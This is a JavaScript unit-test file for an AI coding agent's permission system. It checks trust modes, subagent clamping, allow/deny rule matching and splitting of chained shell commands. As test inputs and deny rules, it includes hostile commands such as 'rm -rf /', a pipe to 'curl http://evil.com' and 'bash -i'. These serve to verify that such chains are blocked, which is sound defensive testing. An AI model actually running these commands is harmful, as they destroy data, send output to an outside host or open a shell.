// Tests for enhanced permission system (Claude Code parity)
// Covers: 5 permission modes, shell operator decomposition, TRUST_LEVELS,
// settings precedence, canUseTool callback, audit logging, mergeFromParent,
// dynamic rules, and permission inheritance chain.

import { describe, it, beforeEach } from "node:test";
import assert from "node:assert/strict";

process.env.INCEPTION_API_KEY = process.env.INCEPTION_API_KEY || "test-key-for-unit-tests";

import {
  PermissionManager,
  PERMISSION_ALLOW,
  PERMISSION_ASK,
  PERMISSION_DENY,
  MODE_READONLY,
  MODE_APPROVAL,
  MODE_ACCEPT_EDITS,
  MODE_OPEN,
  MODE_DONT_ASK,
  VALID_MODES,
  TRUST_LEVELS,
  getPermissionManager,
  initPermissions,
} from "../src/permissions.js";

import { SubAgent } from "../src/subagent.js";
import { AgentTeam } from "../src/agent-teams.js";
import { ToolExecutor } from "../src/tools/executor.js";

const WORKSPACE = process.cwd();

// ═══════════════════════════════════════════════════════════════════════════
// 1. Permission Modes
// ═══════════════════════════════════════════════════════════════════════════

describe("Permission modes (5-mode system)", () => {
  it("exports all 5 valid modes", () => {
    assert.equal(VALID_MODES.length, 5);
    assert.ok(VALID_MODES.includes(MODE_READONLY));
    assert.ok(VALID_MODES.includes(MODE_APPROVAL));
    assert.ok(VALID_MODES.includes(MODE_ACCEPT_EDITS));
    assert.ok(VALID_MODES.includes(MODE_OPEN));
    assert.ok(VALID_MODES.includes(MODE_DONT_ASK));
  });

  it("MODE_OPEN allows everything", () => {
    const pm = new PermissionManager({ trustMode: MODE_OPEN });
    assert.equal(pm.check("Read", {}).decision, PERMISSION_ALLOW);
    assert.equal(pm.check("Write", {}).decision, PERMISSION_ALLOW);
    assert.equal(pm.check("Bash", {}).decision, PERMISSION_ALLOW);
    assert.equal(pm.check("Fetch", {}).decision, PERMISSION_ALLOW);
    assert.equal(pm.check("Edit", {}).decision, PERMISSION_ALLOW);
  });

  it("MODE_ACCEPT_EDITS allows read + edit tools, asks for Bash", () => {
    const pm = new PermissionManager({ trustMode: MODE_ACCEPT_EDITS });
    // Read tools → allow
    assert.equal(pm.check("Read", {}).decision, PERMISSION_ALLOW);
    assert.equal(pm.check("Glob", {}).decision, PERMISSION_ALLOW);
    assert.equal(pm.check("Grep", {}).decision, PERMISSION_ALLOW);
    // Edit tools → allow
    assert.equal(pm.check("Write", {}).decision, PERMISSION_ALLOW);
    assert.equal(pm.check("Edit", {}).decision, PERMISSION_ALLOW);
    assert.equal(pm.check("Patch", {}).decision, PERMISSION_ALLOW);
    // Bash/Fetch → ask
    assert.equal(pm.check("Bash", {}).decision, PERMISSION_ASK);
    assert.equal(pm.check("Fetch", {}).decision, PERMISSION_ASK);
  });

  it("MODE_APPROVAL allows read tools, asks for everything else", () => {
    const pm = new PermissionManager({ trustMode: MODE_APPROVAL });
    assert.equal(pm.check("Read", {}).decision, PERMISSION_ALLOW);
    assert.equal(pm.check("Glob", {}).decision, PERMISSION_ALLOW);
    assert.equal(pm.check("Write", {}).decision, PERMISSION_ASK);
    assert.equal(pm.check("Bash", {}).decision, PERMISSION_ASK);
    assert.equal(pm.check("Fetch", {}).decision, PERMISSION_ASK);
  });

  it("MODE_DONT_ASK allows reads, denies everything else", () => {
    const pm = new PermissionManager({ trustMode: MODE_DONT_ASK });
    assert.equal(pm.check("Read", {}).decision, PERMISSION_ALLOW);
    assert.equal(pm.check("Glob", {}).decision, PERMISSION_ALLOW);
    // Write/Bash → deny (not ask)
    assert.equal(pm.check("Write", {}).decision, PERMISSION_DENY);
    assert.equal(pm.check("Bash", {}).decision, PERMISSION_DENY);
    assert.equal(pm.check("Fetch", {}).decision, PERMISSION_DENY);
  });

  it("MODE_READONLY allows reads, asks for Fetch, denies writes", () => {
    const pm = new PermissionManager({ trustMode: MODE_READONLY });
    assert.equal(pm.check("Read", {}).decision, PERMISSION_ALLOW);
    assert.equal(pm.check("Glob", {}).decision, PERMISSION_ALLOW);
    assert.equal(pm.check("Fetch", {}).decision, PERMISSION_ASK);
    assert.equal(pm.check("Write", {}).decision, PERMISSION_DENY);
    assert.equal(pm.check("Bash", {}).decision, PERMISSION_DENY);
    assert.equal(pm.check("Edit", {}).decision, PERMISSION_DENY);
  });

  it("defaults to MODE_APPROVAL when no mode specified", () => {
    const pm = new PermissionManager();
    assert.equal(pm.trustMode, MODE_APPROVAL);
  });
});

// ═══════════════════════════════════════════════════════════════════════════
// 2. TRUST_LEVELS
// ═══════════════════════════════════════════════════════════════════════════

describe("TRUST_LEVELS ordering", () => {
  it("has correct ordering: open < acceptEdits < approval < dontAsk < readonly", () => {
    assert.ok(TRUST_LEVELS[MODE_OPEN] < TRUST_LEVELS[MODE_ACCEPT_EDITS]);
    assert.ok(TRUST_LEVELS[MODE_ACCEPT_EDITS] < TRUST_LEVELS[MODE_APPROVAL]);
    assert.ok(TRUST_LEVELS[MODE_APPROVAL] < TRUST_LEVELS[MODE_DONT_ASK]);
    assert.ok(TRUST_LEVELS[MODE_DONT_ASK] < TRUST_LEVELS[MODE_READONLY]);
  });

  it("has exactly 5 entries", () => {
    assert.equal(Object.keys(TRUST_LEVELS).length, 5);
  });
});

// ═══════════════════════════════════════════════════════════════════════════
// 3. Trust Mode Clamping with 5-mode levels
// ═══════════════════════════════════════════════════════════════════════════

describe("Trust mode clamping (5-mode)", () => {
  it("child cannot escalate from approval to open", () => {
    const agent = new SubAgent({
      task: "test",
      workspace: WORKSPACE,
      trustMode: "approval",
      agentDef: { permissionMode: "open" },
    });
    assert.equal(agent.trustMode, "approval");
  });

  it("child can restrict from open to approval", () => {
    const agent = new SubAgent({
      task: "test",
      workspace: WORKSPACE,
      trustMode: "open",
      agentDef: { permissionMode: "approval" },
    });
    assert.equal(agent.trustMode, "approval");
  });

  it("child cannot escalate from approval to acceptEdits", () => {
    const agent = new SubAgent({
      task: "test",
      workspace: WORKSPACE,
      trustMode: "approval",
      agentDef: { permissionMode: "acceptEdits" },
    });
    // acceptEdits (1) < approval (2), so child wants LESS restrictive → clamp to parent
    assert.equal(agent.trustMode, "approval");
  });

  it("child can restrict from acceptEdits to approval", () => {
    const agent = new SubAgent({
      task: "test",
      workspace: WORKSPACE,
      trustMode: "acceptEdits",
      agentDef: { permissionMode: "approval" },
    });
    assert.equal(agent.trustMode, "approval");
  });

  it("child can restrict from approval to dontAsk", () => {
    const agent = new SubAgent({
      task: "test",
      workspace: WORKSPACE,
      trustMode: "approval",
      agentDef: { permissionMode: "dontAsk" },
    });
    assert.equal(agent.trustMode, "dontAsk");
  });

  it("child can restrict from approval to readonly", () => {
    const agent = new SubAgent({
      task: "test",
      workspace: WORKSPACE,
      trustMode: "approval",
      agentDef: { permissionMode: "readonly" },
    });
    assert.equal(agent.trustMode, "readonly");
  });

  it("child with no override inherits parent mode", () => {
    const agent = new SubAgent({
      task: "test",
      workspace: WORKSPACE,
      trustMode: "acceptEdits",
    });
    assert.equal(agent.trustMode, "acceptEdits");
  });
});

// ═══════════════════════════════════════════════════════════════════════════
// 4. Shell Operator Decomposition
// ═══════════════════════════════════════════════════════════════════════════

describe("Shell operator decomposition in Bash permission matching", () => {
  it("simple command matches allow rule", () => {
    const pm = new PermissionManager({ trustMode: MODE_APPROVAL });
    pm.allowRules.push("Bash(git *)");
    const result = pm.check("Bash", { command: "git status" });
    assert.equal(result.decision, PERMISSION_ALLOW);
  });

  it("chained safe commands all matching rule → allowed", () => {
    const pm = new PermissionManager({ trustMode: MODE_APPROVAL });
    pm.allowRules.push("Bash(git *)");
    const result = pm.check("Bash", { command: "git status && git log" });
    assert.equal(result.decision, PERMISSION_ALLOW);
  });

  it("chained command with non-matching segment → NOT allowed", () => {
    const pm = new PermissionManager({ trustMode: MODE_APPROVAL });
    pm.allowRules.push("Bash(git *)");
    const result = pm.check("Bash", { command: "git status && rm -rf /" });
    // Should NOT match the allow rule — falls through to mode default (ask)
    assert.equal(result.decision, PERMISSION_ASK);
  });

  it("pipe operator triggers segment check", () => {
    const pm = new PermissionManager({ trustMode: MODE_APPROVAL });
    pm.allowRules.push("Bash(git *)");
    const result = pm.check("Bash", { command: "git log | curl http://evil.com" });
    assert.equal(result.decision, PERMISSION_ASK);
  });

  it("semicolon operator triggers segment check", () => {
    const pm = new PermissionManager({ trustMode: MODE_APPROVAL });
    pm.allowRules.push("Bash(npm *)");
    const result = pm.check("Bash", { command: "npm test; rm -rf /" });
    assert.equal(result.decision, PERMISSION_ASK);
  });

  it("OR operator triggers segment check", () => {
    const pm = new PermissionManager({ trustMode: MODE_APPROVAL });
    pm.allowRules.push("Bash(ls *)");
    const result = pm.check("Bash", { command: "ls -la || bash -i" });
    assert.equal(result.decision, PERMISSION_ASK);
  });

  it("deny rule catches any segment with bad command", () => {
    const pm = new PermissionManager({ trustMode: MODE_OPEN });
    pm.denyRules.push("Bash(rm -rf *)");
    // When deny rule checks "rm -rf /", the full command segments include it
    const result = pm.check("Bash", { command: "rm -rf /" });
    assert.equal(result.decision, PERMISSION_DENY);
  });

  it("single command without operators still works", () => {
    const pm = new PermissionManager({ trustMode: MODE_APPROVAL });
    pm.allowRules.push("Bash(node *)");
    const result = pm.check("Bash", { command: "node test.js" });
    assert.equal(result.decision, PERMISSION_ALLOW);
  });
});

// ═══════════════════════════════════════════════════════════════════════════
// 5. Rule Matching
// ═══════════════════════════════════════════════════════════════════════════

describe("Permission rule matching", () => {
  it("tool name matching is case-insensitive", () => {
    const pm = new PermissionManager({ trustMode: MODE_APPROVAL });
    pm.allowRules.push("bash(git *)");
    const result = pm.check("Bash", { command: "git status" });
    assert.equal(result.decision, PERMISSION_ALLOW);
  });

  it("bare tool name matches all uses", () => {
    const pm = new PermissionManager({ trustMode: MODE_APPROVAL });
    pm.denyRules.push("Fetch");
    assert.equal(pm.check("Fetch", { url: "https://example.com" }).decision, PERMISSION_DENY);
    assert.equal(pm.check("Fetch", {}).decision, PERMISSION_DENY);
  });

  it("wildcard specifier matches all uses", () => {
    const pm = new PermissionManager({ trustMode: MODE_APPROVAL });
    pm.allowRules.push("Write(*)");
    assert.equal(pm.check("Write", { file_path: "/any/path" }).decision, PERMISSION_ALLOW);
  });

  it("path glob patterns work for Write", () => {
    const pm = new PermissionManager({ trustMode: MODE_APPROVAL });
    pm.allowRules.push("Write(src/**)");
    assert.equal(pm.check("Write", { file_path: "src/foo/bar.js" }).decision, PERMISSION_ALLOW);
    // Outside src → falls through to mode default
    assert.equal(pm.check("Write", { file_path: "lib/foo.js" }).decision, PERMISSION_ASK);
  });

  it("Agent type specifier works", () => {
    const pm = new PermissionManager({ trustMode: MODE_APPROVAL });
    pm.allowRules.push("SubAgent(explore)");
    assert.equal(pm.check("SubAgent", { agent_type: "explore" }).decision, PERMISSION_ALLOW);
    assert.equal(pm.check("SubAgent", { agent_type: "general-purpose" }).decision, PERMISSION_ASK);
  });

  it("deny rules take priority over allow rules", () => {
    const pm = new PermissionManager({ trustMode: MODE_OPEN });
    pm.allowRules.push("Bash(git *)");
    pm.denyRules.push("Bash(git push --force *)");
    assert.equal(pm.check("Bash", { command: "git push --force origin main" }).decision, PERMISSION_DENY);
    assert.equal(pm.check("Bash", { command: "git status" }).decision, PERMISSION_ALLOW);
  });
});

// ═══════════════════════════════════════════════════════════════════════════
// 6. canUseTool Callback
// ═══════════════════════════════════════════════════════════════════════════

describe("canUseTool callback (checkAsync)", () => {
  it("callback can deny a tool call", async () => {
    const pm = new PermissionManager({
      trustMode: MODE_OPEN,
      canUseTool: async (toolName) => {
        if (toolName === "Bash") return { behavior: "deny", message: "Bash denied by callback" };
        return null;
      },
    });
    const result = await pm.checkAsync("Bash", { command: "echo hi" });
    assert.equal(result.decision, PERMISSION_DENY);
    assert.equal(result.source, "canUseTool");
  });

  it("callback can allow a tool call", async () => {
    const pm = new PermissionManager({
      trustMode: MODE_APPROVAL,
      canUseTool: async (toolName) => {
        if (toolName === "Write") return { behavior: "allow" };
        return null;
      },
    });
    const result = await pm.checkAsync("Write", { file_path: "/test" });
    assert.equal(result.decision, PERMISSION_ALLOW);
    assert.equal(result.source, "canUseTool");
  });

  it("callback receives ruleDecision context", async () => {
    let receivedContext = null;
    const pm = new PermissionManager({
      trustMode: MODE_APPROVAL,
      canUseTool: async (toolName, input, context) => {
        receivedContext = context;
        return null;
      },
    });
    pm.allowRules.push("Read");
    await pm.checkAsync("Read", {});
    assert.ok(receivedContext);
    assert.equal(receivedContext.ruleDecision, PERMISSION_ALLOW);
  });

  it("deny rules bypass callback entirely", async () => {
    let callbackCalled = false;
    const pm = new PermissionManager({
      trustMode: MODE_OPEN,
      canUseTool: async () => {
        callbackCalled = true;
        return { behavior: "allow" };
      },
    });
    pm.denyRules.push("Bash(rm *)");
    const result = await pm.checkAsync("Bash", { command: "rm -rf /" });
    assert.equal(result.decision, PERMISSION_DENY);
    assert.equal(callbackCalled, false);
  });

  it("callback error falls through to sync result", async () => {
    const pm = new PermissionManager({
      trustMode: MODE_OPEN,
      canUseTool: async () => {
        throw new Error("callback crashed");
      },
    });
    const result = await pm.checkAsync("Read", {});
    assert.equal(result.decision, PERMISSION_ALLOW); // mode_open allows
  });

  it("callback can provide updatedInput", async () => {
    const pm = new PermissionManager({
      trustMode: MODE_APPROVAL,
      canUseTool: async () => ({
        behavior: "allow",
        updatedInput: { command: "echo sanitized" },
      }),
    });
    const result = await pm.checkAsync("Bash", { command: "echo original" });
    assert.equal(result.decision, PERMISSION_ALLOW);
    assert.deepEqual(result.updatedInput, { command: "echo sanitized" });
  });
});

// ═══════════════════════════════════════════════════════════════════════════
// 7. toConfig / fromConfig / mergeFromParent
// ═══════════════════════════════════════════════════════════════════════════

describe("Permission serialization and inheritance", () => {
  it("toConfig exports all rules", () => {
    const pm = new PermissionManager();
    pm.allowRules = ["Read", "Glob"];
    pm.askRules = ["Write"];
    pm.denyRules = ["Bash(rm -rf *)"];
    const config = pm.toConfig();
    assert.deepEqual(config.allow, ["Read", "Glob"]);
    assert.deepEqual(config.ask, ["Write"]);
    assert.deepEqual(config.deny, ["Bash(rm -rf *)"]);
  });

  it("fromConfig imports rules", () => {
    const pm = new PermissionManager();
    pm.fromConfig({
      allow: ["Read"],
      ask: ["Write"],
      deny: ["Fetch"],
    });
    assert.deepEqual(pm.allowRules, ["Read"]);
    assert.deepEqual(pm.askRules, ["Write"]);
    assert.deepEqual(pm.denyRules, ["Fetch"]);
    assert.equal(pm._loaded, true);
  });

  it("mergeFromParent inherits parent deny rules", () => {
    const pm = new PermissionManager();
    pm.mergeFromParent(
      { allow: ["Read"], ask: [], deny: ["Bash(rm -rf *)"] },
      { allow: ["Write"], ask: [], deny: [] }
    );
    assert.ok(pm.denyRules.includes("Bash(rm -rf *)"));
    assert.ok(pm.allowRules.includes("Read"));
    assert.ok(pm.allowRules.includes("Write"));
  });

  it("mergeFromParent with child deny overrides parent allow", () => {
    const pm = new PermissionManager({ trustMode: MODE_OPEN });
    pm.mergeFromParent(
      { allow: ["Bash(git *)"], ask: [], deny: [] },
      { allow: [], ask: [], deny: ["Bash(git push *)"] }
    );
    // Parent allows "Bash(git *)" but child denies "Bash(git push *)"
    // Deny takes priority in check()
    assert.equal(pm.check("Bash", { command: "git push origin main" }).decision, PERMISSION_DENY);
    assert.equal(pm.check("Bash", { command: "git status" }).decision, PERMISSION_ALLOW);
  });

  it("toConfig creates independent copy", () => {
    const pm = new PermissionManager();
    pm.allowRules = ["Read"];
    const config = pm.toConfig();
    config.allow.push("Write");
    assert.equal(pm.allowRules.length, 1); // Original not modified
  });
});

// ═══════════════════════════════════════════════════════════════════════════
// 8. Dynamic Rule Management
// ═══════════════════════════════════════════════════════════════════════════

describe("Dynamic rule management (addRule/removeRule)", () => {
  it("addRule adds to correct list", () => {
    const pm = new PermissionManager();
    pm.addRule(PERMISSION_ALLOW, "Read");
    pm.addRule(PERMISSION_ASK, "Write");
    pm.addRule(PERMISSION_DENY, "Fetch");
    assert.ok(pm.allowRules.includes("Read"));
    assert.ok(pm.askRules.includes("Write"));
    assert.ok(pm.denyRules.includes("Fetch"));
  });

  it("addRule doesn't duplicate", () => {
    const pm = new PermissionManager();
    pm.addRule(PERMISSION_ALLOW, "Read");
    pm.addRule(PERMISSION_ALLOW, "Read");
    assert.equal(pm.allowRules.filter((r) => r === "Read").length, 1);
  });

  it("removeRule removes from all lists", () => {
    const pm = new PermissionManager();
    pm.allowRules = ["Read", "Write"];
    pm.askRules = ["Read"];
    pm.denyRules = ["Read"];
    pm.removeRule("Read");
    assert.ok(!pm.allowRules.includes("Read"));
    assert.ok(!pm.askRules.includes("Read"));
    assert.ok(!pm.denyRules.includes("Read"));
    assert.ok(pm.allowRules.includes("Write"));
  });
});

// ═══════════════════════════════════════════════════════════════════════════
// 9. Permission Inheritance Chain (executor → subagent → agent-teams)
// ═══════════════════════════════════════════════════════════════════════════

describe("Permission inheritance chain", () => {
  it("ToolExecutor accepts permissionRules in constructor", () => {
    const rules = { allow: ["Read"], ask: [], deny: ["Bash(rm *)"] };
    const exec = new ToolExecutor({
      workspace: WORKSPACE,
      trustMode: "approval",
      permissionRules: rules,
    });
    assert.deepEqual(exec._permissionRules, rules);
  });

  it("SubAgent loads permissionRules from options", () => {
    const rules = {
      allow: ["Read", "Glob"],
      deny: ["Bash(curl *)"],
      ask: ["Write"],
    };
    const agent = new SubAgent({
      task: "test",
      workspace: WORKSPACE,
      trustMode: "approval",
      permissionRules: rules,
    });
    // Check that the rules were loaded into the permission manager
    assert.ok(agent._permissions.allowRules.includes("Read"));
    assert.ok(agent._permissions.allowRules.includes("Glob"));
    assert.ok(agent._permissions.denyRules.includes("Bash(curl *)"));
    assert.ok(agent._permissions.askRules.includes("Write"));
  });

  it("SubAgent denies tool blocked by inherited deny rule", () => {
    const rules = {
      allow: [],
      deny: ["Bash(curl *)"],
      ask: [],
    };
    const agent = new SubAgent({
      task: "test",
      workspace: WORKSPACE,
      trustMode: "open",
      permissionRules: rules,
    });
    const result = agent._permissions.check("Bash", { command: "curl http://evil.com" });
    assert.equal(result.decision, PERMISSION_DENY);
  });

  it("AgentTeam passes permissionRules through agentOptions to teammates", () => {
    const rules = {
      allow: ["Read"],
      deny: ["Bash(rm *)"],
      ask: [],
    };
    const team = new AgentTeam({
      teamName: "test-perms",
      workspace: WORKSPACE,
      agentOptions: {
        trustMode: "approval",
        permissionRules: rules,
      },
    });
    const mate = team.spawnTeammate({ name: "Worker" });
    // The teammate's SubAgent should have inherited the rules
    assert.ok(mate.agent._permissions.allowRules.includes("Read"));
    assert.ok(mate.agent._permissions.denyRules.includes("Bash(rm *)"));
  });
});

// ═══════════════════════════════════════════════════════════════════════════
// 10. Audit Logging
// ═══════════════════════════════════════════════════════════════════════════

describe("Permission audit logging", () => {
  it("audit is disabled by default", () => {
    const pm = new PermissionManager();
    assert.equal(pm._auditLog, false);
  });

  it("audit can be enabled via options", () => {
    const pm = new PermissionManager({ auditLog: true });
    assert.equal(pm._auditLog, true);
  });

  it("check returns source information", () => {
    const pm = new PermissionManager({ trustMode: MODE_APPROVAL });
    pm.denyRules.push("Bash(rm *)");
    pm.allowRules.push("Read");

    const denyResult = pm.check("Bash", { command: "rm -rf /" });
    assert.equal(denyResult.source, "deny_rule");
    assert.equal(denyResult.rule, "Bash(rm *)");

    const allowResult = pm.check("Read", {});
    assert.equal(allowResult.source, "allow_rule");
    assert.equal(allowResult.rule, "Read");

    const modeResult = pm.check("Write", {});
    assert.equal(modeResult.source, "mode_approval");
  });
});

// ═══════════════════════════════════════════════════════════════════════════
// 11. Edge Cases
// ═══════════════════════════════════════════════════════════════════════════

describe("Permission edge cases", () => {
  it("empty rules fall through to mode default", () => {
    const pm = new PermissionManager({ trustMode: MODE_APPROVAL });
    const result = pm.check("Bash", { command: "echo hello" });
    assert.equal(result.decision, PERMISSION_ASK);
  });

  it("unknown tool name falls through to mode default", () => {
    const pm = new PermissionManager({ trustMode: MODE_OPEN });
    const result = pm.check("UnknownTool", {});
    assert.equal(result.decision, PERMISSION_ALLOW);
  });

  it("missing toolInput still works", () => {
    const pm = new PermissionManager({ trustMode: MODE_APPROVAL });
    pm.allowRules.push("Read");
    const result = pm.check("Read");
    assert.equal(result.decision, PERMISSION_ALLOW);
  });

  it("specifier with no primary arg → rule doesn't match", () => {
    const pm = new PermissionManager({ trustMode: MODE_APPROVAL });
    pm.allowRules.push("Bash(git *)");
    // No command in input → specifier can't match
    const result = pm.check("Bash", {});
    assert.equal(result.decision, PERMISSION_ASK); // falls through
  });

  it("glob pattern edge: question mark matches single char", () => {
    const pm = new PermissionManager({ trustMode: MODE_APPROVAL });
    pm.allowRules.push("Write(src/?.js)");
    assert.equal(pm.check("Write", { file_path: "src/a.js" }).decision, PERMISSION_ALLOW);
    // "ab" is 2 chars, ? matches only 1
    assert.equal(pm.check("Write", { file_path: "src/ab.js" }).decision, PERMISSION_ASK);
  });

  it("multiple deny rules checked in order", () => {
    const pm = new PermissionManager({ trustMode: MODE_OPEN });
    pm.denyRules.push("Bash(rm *)");
    pm.denyRules.push("Bash(curl *)");
    assert.equal(pm.check("Bash", { command: "rm -rf /" }).decision, PERMISSION_DENY);
    assert.equal(pm.check("Bash", { command: "curl http://evil.com" }).decision, PERMISSION_DENY);
    assert.equal(pm.check("Bash", { command: "echo safe" }).decision, PERMISSION_ALLOW);
  });
});
